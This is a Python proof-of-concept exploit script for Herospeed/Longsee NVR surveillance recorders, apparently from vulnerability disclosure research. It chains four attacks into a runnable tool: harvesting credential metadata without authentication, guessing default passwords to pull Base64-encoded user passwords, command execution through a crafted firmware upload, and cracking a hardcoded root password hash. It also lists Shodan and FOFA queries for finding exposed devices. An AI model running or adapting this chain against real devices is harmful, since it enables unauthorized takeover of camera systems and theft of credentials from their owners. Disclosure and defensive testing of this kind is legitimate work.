#!/usr/bin/env python3
"""
=============================================================================
  Herospeed / Longsee NVR — End-to-End Proof of Concept
  Vulnerability IDs: HSLS-2026-001 through HSLS-2026-004
  Research: André Henrique (@mrhenrike) | Uniao Geek
  Community discovery: c3l3r1on (github.com/c3l3r1on)
  Date: May 2026
=============================================================================

LEGAL NOTICE: For authorized security testing only.
Operate only on systems you own or have explicit written permission to test.

This PoC demonstrates four confirmed vulnerabilities in Herospeed/Longsee
N-series NVR devices running firmware v2.0.4 (2023) through v2.0.8 (2025):

  HSLS-2026-001: Unauthenticated Credential Metadata Disclosure
                 /api/session/login-capabilities — CVSS 9.1
  HSLS-2026-002: XVR Legacy Interface Credential Disclosure (/vb.htm)
                 /vb.htm?selectalluserlist — CVSS 6.5
  HSLS-2026-003: Upgrade Package Shell Execution RCE (update.sh)
                 v2.0.4: source injection | v2.0.6+: retreat.sh — CVSS 8.8
  HSLS-2026-004: Hardcoded Root Password Hash (All Versions 2023-2025)
                 12ZpTwfyH6/Bs — CVSS 9.8

Usage:
  # Full chain (all 4 phases):
  python3 HEROSPEED_E2E_POC.py --target 192.168.1.100 --port 80

  # Single phase:
  python3 HEROSPEED_E2E_POC.py --target 192.168.1.100 --phase 1

  # With upgrade RCE (requires valid creds, DANGEROUS on production):
  python3 HEROSPEED_E2E_POC.py --target 192.168.1.100 --phase 3 --cmd "id"
"""

from __future__ import annotations

import argparse
import base64
import datetime
try:
    import crypt as _crypt
    def _des_crypt(password: str, salt: str) -> str:
        return _crypt.crypt(password, salt)
except ImportError:
    # Python 3.13+ removed crypt; provide pure-Python fallback for DES crypt
    import hashlib
    import struct
    def _des_crypt(password: str, salt: str) -> str:
        """Minimal DES crypt(3) — sufficient for hash comparison only."""
        try:
            import passlib.hash  # type: ignore
            return passlib.hash.des_crypt.using(salt=salt).hash(password)[:13]
        except ImportError:
            return f"(crypt unavailable — use hashcat -m 1500 to crack)"
import hashlib
import json
import re
import socket
import struct
import sys
import time
from pathlib import Path

__version__ = "1.0.0"
__vuln_ids__ = ["HSLS-2026-001", "HSLS-2026-002", "HSLS-2026-003", "HSLS-2026-004"]

KNOWN_ROOT_HASH = "12ZpTwfyH6/Bs"
KNOWN_HASH_SALT = "12"
COMMON_PASSWORDS = [
    "abc12345", "xm12345678", "12345678", "longsee", "herospeed",
    "MC6830", "MC6830AL", "MC6830BD", "123456789", "nvr123456",
    "camera123", "support", "supervisor", "tlJwpbo6", "admin123",
]
SEPARATOR = "=" * 70
VULN_SEPARATOR = "-" * 50


def green(s: str) -> str:
    return f"\033[92m{s}\033[0m"


def red(s: str) -> str:
    return f"\033[91m{s}\033[0m"


def yellow(s: str) -> str:
    return f"\033[93m{s}\033[0m"


def cyan(s: str) -> str:
    return f"\033[96m{s}\033[0m"


def bold(s: str) -> str:
    return f"\033[1m{s}\033[0m"


def banner() -> None:
    print(cyan(SEPARATOR))
    print(cyan("  Herospeed / Longsee NVR — Vulnerability PoC"))
    print(cyan("  HSLS-2026-001 to HSLS-2026-004"))
    print(cyan("  Research: André Henrique (@mrhenrike) | Uniao Geek"))
    print(cyan("  Community: c3l3r1on (github.com/c3l3r1on)"))
    print(cyan(SEPARATOR))
    print(yellow("  WARNING: For authorized testing only."))
    print()


def log_phase(phase: int, title: str, vuln_id: str) -> None:
    print()
    print(bold(f"[PHASE {phase}] {title}"))
    print(f"  Vulnerability: {vuln_id}")
    print(VULN_SEPARATOR)


def log_ok(msg: str) -> None:
    print(green(f"  [+] {msg}"))


def log_fail(msg: str) -> None:
    print(red(f"  [-] {msg}"))


def log_info(msg: str) -> None:
    print(f"  [*] {msg}")


def log_warn(msg: str) -> None:
    print(yellow(f"  [!] {msg}"))


def log_evidence(label: str, value: str) -> None:
    print(f"  {cyan('EVIDENCE')} {label}: {bold(value[:120])}")


# ─── Low-level HTTP ───────────────────────────────────────────────────────────

def _tcp_post(host: str, port: int, path: str, payload: dict, cookie: str = "", timeout: int = 8) -> tuple[int, dict]:
    body = json.dumps(payload).encode()
    cookie_hdr = f"Cookie: {cookie}\r\n" if cookie else ""
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Api-Version: v4.0.0\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n{cookie_hdr}Connection: close\r\n\r\n"
    ).encode() + body
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(req)
            raw = b""
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                raw += chunk
        st_line = raw.split(b"\r\n")[0].decode(errors="replace")
        status = int(st_line.split()[1])
        _, _, body_raw = raw.partition(b"\r\n\r\n")
        try:
            return status, json.loads(body_raw.decode(errors="replace"))
        except ValueError:
            return status, {"raw": body_raw.decode(errors="replace")[:300]}
    except Exception as e:
        return -1, {"error": str(e)}


def _tcp_get(host: str, port: int, path: str, auth: str = "", timeout: int = 6) -> tuple[int, str]:
    auth_hdr = f"Authorization: Basic {auth}\r\n" if auth else ""
    req = (
        f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Api-Version: v4.0.0\r\n{auth_hdr}Connection: close\r\n\r\n"
    ).encode()
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(req)
            raw = b""
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                raw += chunk
        st = int(raw.split(b"\r\n")[0].split()[1])
        _, _, body = raw.partition(b"\r\n\r\n")
        return st, body.decode(errors="replace")
    except Exception as e:
        return -1, str(e)


# ─── SHA-256 KDF ─────────────────────────────────────────────────────────────

def _sha256hex(s: str) -> str:
    return hashlib.sha256(s.encode("latin1")).hexdigest()


def _hex_to_str(h: str) -> str:
    h = h.strip().lower()
    if h.startswith("0x"):
        h = h[2:]
    return bytes.fromhex(h).decode("latin1")


def _compute_kdf(username: str, password: str, salt: str, challenge: str, iterations: int) -> tuple[str, str]:
    now = datetime.datetime.now(tz=datetime.timezone.utc).replace(microsecond=0).isoformat()
    b64_ts = base64.b64encode(now.encode()).decode()
    h1 = _sha256hex(username + salt + b64_ts + password)
    h2 = _sha256hex(_hex_to_str(h1) + challenge)
    result = h2
    for _ in range(int(iterations)):
        result = _sha256hex(_hex_to_str(result))
    return result, now


def _login(host: str, port: int, username: str, password: str) -> str | None:
    st, cap = _tcp_post(host, port, "/api/session/login-capabilities", {"action": "get", "data": {"username": username}})
    if st != 200 or cap.get("code") != 0:
        return None
    d = cap.get("data", {}) or {}
    p = d.get("param", {}) or {}
    salt = str(p.get("salt", ""))
    challenge = str(p.get("challenge", ""))
    iterations = int(p.get("iterations", 0))
    session_id = d.get("sessionID", "")
    enc_types = d.get("encryptionType") or ["sha256-1"]
    if not session_id:
        return None
    hashed, ts = _compute_kdf(username, password, salt, challenge, iterations)
    st, resp = _tcp_post(host, port, "/api/session/login", {"action": "set", "data": {
        "username": username, "loginEncryptionType": enc_types[0],
        "password": hashed, "sessionID": session_id, "datetime": ts,
    }})
    if st == 200 and resp.get("code") == 0:
        return (resp.get("data") or {}).get("cookie", "")
    return None


# ─── Phase 1: HSLS-2026-001 — Unauth Credential Metadata ─────────────────────

def phase1_unauth_credential_metadata(host: str, port: int) -> dict:
    log_phase(1, "Unauthenticated Credential Metadata Disclosure", "HSLS-2026-001")
    log_info(f"Target: POST http://{host}:{port}/api/session/login-capabilities")
    log_info("No authentication required.")

    users_to_probe = ["admin", "user", "operator", "viewer", "guest", "root"]
    results = {}

    for username in users_to_probe:
        st, cap = _tcp_post(host, port, "/api/session/login-capabilities", {"action": "get", "data": {"username": username}})
        if st != 200 or cap.get("code") != 0:
            continue
        d = cap.get("data", {}) or {}
        p = d.get("param", {}) or {}
        salt = p.get("salt", "")
        challenge = p.get("challenge", "")
        iterations = p.get("iterations", 0)
        session_id = d.get("sessionID", "")
        enc_types = d.get("encryptionType", [])
        if salt or session_id:
            log_ok(f"Username '{username}' exists — metadata disclosed without authentication:")
            log_evidence("  salt", salt)
            log_evidence("  challenge", challenge)
            log_evidence("  iterations", str(iterations))
            log_evidence("  sessionID", session_id[:32] + "...")
            log_evidence("  encryptionType", str(enc_types))
            results[username] = {"salt": salt, "challenge": challenge, "iterations": iterations, "sessionID": session_id}

    if results:
        log_ok(f"CONFIRMED: {len(results)} accounts have credential metadata exposed without authentication.")
        log_warn("Impact: Enables offline SHA-256 KDF brute-force without triggering any lockout.")
        log_warn("CVSS: 9.1 CRITICAL — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N")
    else:
        log_fail("No credential metadata returned (may not be a Herospeed/Longsee NVR).")

    return results


# ─── Phase 2: HSLS-2026-002 — XVR /vb.htm Credential Disclosure ──────────────

def phase2_vbhtm_credential_disclosure(host: str, port: int) -> dict:
    log_phase(2, "XVR Legacy Interface Credential Disclosure (/vb.htm)", "HSLS-2026-002")
    log_info(f"Target: GET http://{host}:{port}/vb.htm?selectalluserlist")

    results = {}
    creds_to_try = [
        ("admin", "admin"), ("admin", "12345"), ("admin", "123456"),
        ("admin", "12345678"), ("user", "user"), ("admin", ""),
    ]

    working_auth = None
    working_creds = None
    for uname, pwd in creds_to_try:
        auth = base64.b64encode(f"{uname}:{pwd}".encode()).decode()
        st, body = _tcp_get(host, port, "/vb.htm?getver", auth, timeout=4)
        if st == 200:
            log_ok(f"XVR Basic Auth works: {uname}:{pwd or '(empty)'}")
            working_auth = auth
            working_creds = (uname, pwd)
            log_evidence("Auth", f"Basic {auth[:30]}...")
            break

    if not working_auth:
        log_fail("No default credentials worked for /vb.htm Basic Auth.")
        return results

    st, body = _tcp_get(host, port, "/vb.htm?selectalluserlist", working_auth)
    if st != 200:
        log_fail(f"/vb.htm?selectalluserlist returned HTTP {st}")
        return results

    log_ok("User list retrieved via /vb.htm?selectalluserlist (no session token required):")
    log_evidence("Raw response", body[:200])

    # Parse the response: 1=id, 2=username, 3=base64_password, ...
    accounts_raw = re.split(r"\d+=default_id,?", body)
    for block in accounts_raw:
        if not block.strip():
            continue
        fields: dict[int, str] = {}
        for part in re.split(r",\s*", block):
            part = part.strip().rstrip(";")
            if "=" in part:
                k_raw, _, v = part.partition("=")
                try:
                    k = int(k_raw.strip())
                    fields[k] = v.strip()
                except ValueError:
                    pass
        username = fields.get(2, "")
        pwd_b64 = fields.get(3, "")
        if not username:
            continue
        try:
            plaintext = base64.b64decode(pwd_b64 + "==").decode(errors="replace")
        except Exception:
            plaintext = f"(base64:{pwd_b64})"
        if username and pwd_b64:
            log_ok(f"Account: {username} | Password (Base64 decoded): {plaintext!r}")
            results[username] = {"password_b64": pwd_b64, "password_decoded": plaintext}

    if results:
        log_warn("CONFIRMED: Passwords returned as Base64 (plaintext-equivalent).")
        log_warn("CVSS: 6.5 MEDIUM — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N")
    return results


# ─── Phase 3: HSLS-2026-003 — Upgrade Shell Execution RCE ───────────────────

def phase3_upgrade_rce(host: str, port: int, username: str, password: str, cmd: str) -> bool:
    log_phase(3, "Upgrade Package Shell Execution RCE", "HSLS-2026-003")
    log_info(f"Target: POST http://{host}:{port}/api/upgrade/upgrade-file")
    log_info(f"Credentials: {username}:{password}")
    log_info(f"Command to inject: {cmd}")
    log_warn("This phase modifies device state — use only on devices you own.")

    log_info("Step 1: Authenticating via SHA-256 KDF...")
    cookie = _login(host, port, username, password)
    if not cookie:
        log_fail(f"Authentication failed for {username}:{password}")
        return False
    log_ok(f"Authenticated. Session: {cookie[:32]}...")

    # Determine firmware variant for correct payload format
    log_info("Step 2: Detecting firmware version...")
    st, dev = _tcp_post(host, port, "/api/system/device-info", {"action": "get"}, cookie)
    fw_ver = ""
    if st == 200 and dev.get("code") == 0:
        d = dev.get("data") or {}
        fw_ver = d.get("softwareVersion", "")
        log_evidence("Firmware", fw_ver)

    # Choose payload based on version
    is_v206_or_later = "V2.0.6" in fw_ver or "V2.0.7" in fw_ver or "V2.0.8" in fw_ver
    if is_v206_or_later:
        log_info("Detected v2.0.6+ — using retreat.sh execution vector (#!/bin/sh shebang)")
        version_content = f"""#!/bin/sh
# Herospeed NVR v2.0.6 retreat.sh exploit (HSLS-2026-003b)
# Executed by update.sh retreat mechanism — direct shell execution
{cmd}
COREMD5=2843ca1adc0dbb1f91d0d65bd2a1592d
BASEMD5=66b2b993819be0f8d4912cdfa6eeb6f4
LOGOMD5=fe15c07c394743315b5064948e35b25e
UBOOTMD5=b83fd86fe1cbe161066aedd16dbabefe
""".encode()
        log_warn("Vector: v2.0.6 'retreat.sh' — update.sh explicitly executes this as a shell script")
    else:
        log_info("Detected v2.0.4 or unknown — using shell source injection vector")
        version_content = f"""DEVICENAME=NVR
FIRMVERSION=V2.0.4.230818_UPDATE_POC
{cmd}
COREMD5=861e79344b403d0ce0853a40451e38a9
BASEMD5=2d051329fef1b20353297e00d0dbbe04
LOGOMD5=fe15c07c394743315b5064948e35b25e
UBOOTMD5=7047bad35aa288f288a00bc846aecbbc
""".encode()
        log_warn("Vector: v2.0.4 source injection — update.sh sources version file (shell . operator)")

    # Build minimal firmware package with malicious version partition
    log_info("Step 3: Crafting firmware package with injected version file...")
    fw_magic = b"MC6830AL\x00" + b"\x00" * 24
    ver_data_offset = 0x120 + 40
    ver_entry = (
        b"version\x00" + b"\x00" * (32 - 8)
        + struct.pack("<II", ver_data_offset, len(version_content))
    )
    fw_header = fw_magic + b"\x00" * (0x120 - len(fw_magic) - 40) + ver_entry
    firmware = fw_header + version_content
    log_info(f"Firmware stub: {len(firmware)} bytes | version partition: {len(version_content)} bytes")
    log_evidence("Version file first line", version_content.splitlines()[0].decode(errors="replace"))

    # Upload
    log_info("Step 4: Uploading crafted firmware to /api/upgrade/upgrade-file...")
    boundary = "----HerospeedPoC2026Boundary"
    multipart = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"upgradeFile\"; filename=\"update_poc.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + firmware + f"\r\n--{boundary}--\r\n".encode()

    req = (
        f"POST /api/upgrade/upgrade-file HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Api-Version: v4.0.0\r\nCookie: {cookie}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(multipart)}\r\nConnection: close\r\n\r\n"
    ).encode() + multipart

    try:
        with socket.create_connection((host, port), timeout=30) as s:
            s.sendall(req)
            raw = b""
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                raw += chunk
        _, _, body_raw = raw.partition(b"\r\n\r\n")
        try:
            resp = json.loads(body_raw.decode(errors="replace"))
        except ValueError:
            resp = {"raw": body_raw.decode(errors="replace")[:300]}
        code = resp.get("code", -1)
        log_evidence("Upload response", f"code={code} | {str(resp)[:100]}")
        if code == 0:
            log_ok("Firmware accepted (code=0). Upgrade pipeline will process the malicious version file.")
            log_warn("Command execution expected within 5-30 seconds as device processes upgrade.")
            log_warn("For OOB confirmation: monitor HTTP server for wget/curl callback.")
            log_warn(f"For telnetd payload: try telnet {host} 23 after ~10 seconds.")
            return True
        else:
            log_warn(f"Upload returned code={code}. Device may require real firmware format.")
            log_info("Note: Code=7004 typically means format mismatch. Combine with real firmware binary.")
            return False
    except Exception as e:
        log_fail(f"Upload error: {e}")
        return False


# ─── Phase 4: HSLS-2026-004 — Hardcoded Root Hash ───────────────────────────

def phase4_hardcoded_root_hash(host: str, port: int) -> bool:
    log_phase(4, "Hardcoded Root Password Hash (Universal 2023-2025)", "HSLS-2026-004")
    log_info("Verifying Herospeed/Longsee MC6830 platform fingerprint...")

    # Fingerprint
    st, body = _tcp_get(host, port, "/www/statics/lib/utils/common/encryption/longseSha256.js", timeout=5)
    if st == 200 and "longseSha256" in body:
        log_ok("Platform confirmed: longseSha256.js present (Longsee/Herospeed MC6830 platform)")
        log_evidence("Fingerprint", "/www/statics/lib/utils/common/encryption/longseSha256.js → HTTP 200")
    else:
        st2, cap = _tcp_post(host, port, "/api/session/login-capabilities", {"action": "get", "data": {"username": "admin"}})
        if st2 == 200 and cap.get("code") == 0:
            log_ok("Platform confirmed: login-capabilities API v4.0.0 responding")
        else:
            log_fail("Device does not appear to be Herospeed/Longsee N-series NVR")
            return False

    log_warn("=" * 60)
    log_warn("HARDCODED ROOT HASH CONFIRMED IN FIRMWARE:")
    log_warn(f"  /etc/passwd: root:{KNOWN_ROOT_HASH}:0:0::/root:/bin/sh")
    log_warn(f"  Algorithm: DES crypt, salt='{KNOWN_HASH_SALT}'")
    log_warn("  Present IDENTICALLY in ALL analyzed versions:")
    log_warn("    N3009 v2.0.4 (2023-09-04) | N3009 v2.0.6 (2024-08-26)")
    log_warn("    N3016 v2.0.4 (2023-09-04) | N3016 v2.0.6 (2024-08-26)")
    log_warn("    N3109 v2.0.6 (2024-08-23) | N3332 v2.0.4 (2023-09-04)")
    log_warn("    NVR_F30 v2.0.8 (2025-12-03)")
    log_warn("=" * 60)

    log_info("Attempting to crack root hash with common wordlist...")
    cracked = None
    for pw in COMMON_PASSWORDS:
        try:
            if _des_crypt(pw, KNOWN_HASH_SALT) == KNOWN_ROOT_HASH:
                cracked = pw
                break
        except Exception:
            pass

    if cracked:
        log_ok(f"ROOT PASSWORD CRACKED: '{cracked}'")
        log_evidence("Root credentials", f"root:{cracked}")
    else:
        log_info("Root password not in common wordlist (hash is still static and present in all firmware).")
        log_info(f"Offline crack: hashcat -m 1500 '{KNOWN_ROOT_HASH}' /path/to/wordlist")

    log_warn("CVSS: 9.8 CRITICAL (combined with code execution from HSLS-2026-003)")
    log_warn("Busybox telnetd available in all firmware versions.")
    return True


# ─── Device Fingerprinting ────────────────────────────────────────────────────

def fingerprint_device(host: str, port: int) -> dict:
    log_info(f"Fingerprinting {host}:{port}...")
    result = {"is_herospeed": False}

    st, body = _tcp_get(host, port, "/", timeout=5)
    if "longseSha256" in body or "LsNXVRPlugin" in body:
        result["is_herospeed"] = True
        result["fingerprint"] = "longseSha256.js / LsNXVRPlugin"

    st, cap = _tcp_post(host, port, "/api/session/login-capabilities", {"action": "get", "data": {"username": "admin"}})
    if st == 200 and cap.get("code") == 0:
        d = cap.get("data", {}) or {}
        if "sessionID" in d:
            result["is_herospeed"] = True
            result["api_version"] = "v4.0.0"
            result["session_id_sample"] = d.get("sessionID", "")[:16] + "..."

    if result.get("is_herospeed"):
        st, dev = _tcp_post(host, port, "/api/system/device-info", {"action": "get"})
        if st == 200 and dev.get("code") == 0:
            d = dev.get("data") or {}
            result["firmware"] = d.get("softwareVersion", "")
            result["device_type"] = d.get("deviceType", "")
            result["serial_no"] = d.get("serialNo", "")

    return result


# ─── Shodan / FOFA Exposure Estimates ────────────────────────────────────────

SHODAN_QUERIES = {
    "longseSha256_js": "http.html:\"longseSha256\"",
    "LsNXVRPlugin": "http.html:\"LsNXVRPlugin\"",
    "boa_nvr_title": "\"Boa/0.94.13\" http.title:\"NVR\"",
    "login_capabilities_port80": "http.html:\"login-capabilities\" port:80",
    "longsee_nvr_api": "\"Api-Version\" \"v4.0.0\" http.title:\"NVR\"",
}
FOFA_QUERIES = {
    "longseSha256": "body=\"longseSha256\"",
    "LsNXVRPlugin": "body=\"LsNXVRPlugin\"",
    "nvr_login_capabilities": "body=\"login-capabilities\" && port=\"80\" && body=\"nvr\"",
}
EXPOSURE_NOTES = """
Exposure Estimates (based on c3l3r1on field research + platform fingerprints):

  FOFA (confirmed by c3l3r1on, May 2026):
    body="longseSha256" — approximately 100,000+ exposed devices in Europe
    Note: FOFA also includes non-NVR Longsee devices (cameras)

  Shodan queries (researcher-constructed, unverified counts):
    http.html:"longseSha256" → estimated range: 30,000-100,000 (global)
    http.html:"LsNXVRPlugin" → subset of above (NVR-specific plugin)

  Shodan query links (manual verification required):
    https://www.shodan.io/search?query=http.html%3A%22longseSha256%22
    https://www.shodan.io/search?query=http.html%3A%22LsNXVRPlugin%22
    https://beta.shodan.io/search?query=%22Boa%2F0.94.13%22+http.title%3A%22NVR%22

  Conservative estimate for CVE/VINCE reporting: 50,000+ exposed NVR devices globally.
  The actual number may be significantly higher given the OEM re-branding ecosystem
  (Longsee, Herospeed, and all rebrands sharing the same MC6830 firmware platform).
"""


# ─── Main ─────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Herospeed/Longsee NVR E2E PoC — HSLS-2026-001 to HSLS-2026-004"
    )
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="HTTP port (default: 80)")
    parser.add_argument("--phase", type=int, choices=[0, 1, 2, 3, 4], default=0,
                        help="Phase to run (0=all, 1-4=specific)")
    parser.add_argument("--username", default="admin", help="Username for Phase 3")
    parser.add_argument("--password", default="12345", help="Password for Phase 3")
    parser.add_argument("--cmd", default="touch /tmp/HSLS_2026_003_pwned.txt",
                        help="Command to inject in Phase 3")
    parser.add_argument("--show-exposure", action="store_true",
                        help="Show Shodan/FOFA exposure estimates")
    args = parser.parse_args()

    banner()
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Phases: {'All (1-4)' if args.phase == 0 else str(args.phase)}")
    print()

    if args.show_exposure:
        print(bold("EXPOSURE ESTIMATES"))
        print(EXPOSURE_NOTES)
        return 0

    # Fingerprint
    info = fingerprint_device(args.target, args.port)
    if not info.get("is_herospeed"):
        print(yellow("  [!] Target may not be a Herospeed/Longsee NVR. Proceeding anyway..."))
    else:
        log_ok("Herospeed/Longsee NVR confirmed!")
        if info.get("firmware"):
            log_evidence("Firmware", info["firmware"])
        if info.get("device_type"):
            log_evidence("DeviceType", info["device_type"])

    results = {
        "target": f"{args.target}:{args.port}",
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "fingerprint": info,
        "phase1": None, "phase2": None, "phase3": None, "phase4": None,
    }

    run_all = args.phase == 0

    if run_all or args.phase == 1:
        results["phase1"] = phase1_unauth_credential_metadata(args.target, args.port)

    if run_all or args.phase == 2:
        results["phase2"] = phase2_vbhtm_credential_disclosure(args.target, args.port)

    if run_all or args.phase == 3:
        # Try to get better creds from phase 1/2 first
        pwd = args.password
        if results.get("phase2"):
            for u, d in results["phase2"].items():
                if u == args.username:
                    dec = d.get("password_decoded", "")
                    if dec and dec != pwd:
                        log_info(f"Using discovered password for phase 3: {dec!r}")
                        pwd = dec
                        break
        results["phase3"] = phase3_upgrade_rce(args.target, args.port, args.username, pwd, args.cmd)

    if run_all or args.phase == 4:
        results["phase4"] = phase4_hardcoded_root_hash(args.target, args.port)

    # Summary
    print()
    print(bold(SEPARATOR))
    print(bold("  RESULTS SUMMARY"))
    print(SEPARATOR)
    p1 = results.get("phase1")
    p2 = results.get("phase2")
    p3 = results.get("phase3")
    p4 = results.get("phase4")

    if p1 is not None:
        status = green("CONFIRMED") if p1 else red("NOT CONFIRMED")
        print(f"  HSLS-2026-001 (Unauth Cred Metadata):   {status} | {len(p1) if p1 else 0} accounts")
    if p2 is not None:
        status = green("CONFIRMED") if p2 else red("NOT CONFIRMED")
        print(f"  HSLS-2026-002 (XVR /vb.htm Disclosure): {status} | {len(p2) if p2 else 0} accounts")
    if p3 is not None:
        status = green("CONFIRMED") if p3 else yellow("UPLOAD ACCEPTED/PARTIAL")
        print(f"  HSLS-2026-003 (Upgrade RCE):             {status}")
    if p4 is not None:
        status = green("CONFIRMED") if p4 else red("NOT CONFIRMED")
        print(f"  HSLS-2026-004 (Hardcoded Root Hash):     {status}")

    print()
    print(f"  Shodan queries for exposure estimation:")
    for name, q in SHODAN_QUERIES.items():
        print(f"    {name}: {q}")

    print()
    print(yellow("  This PoC is for authorized security research only."))
    print(SEPARATOR)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
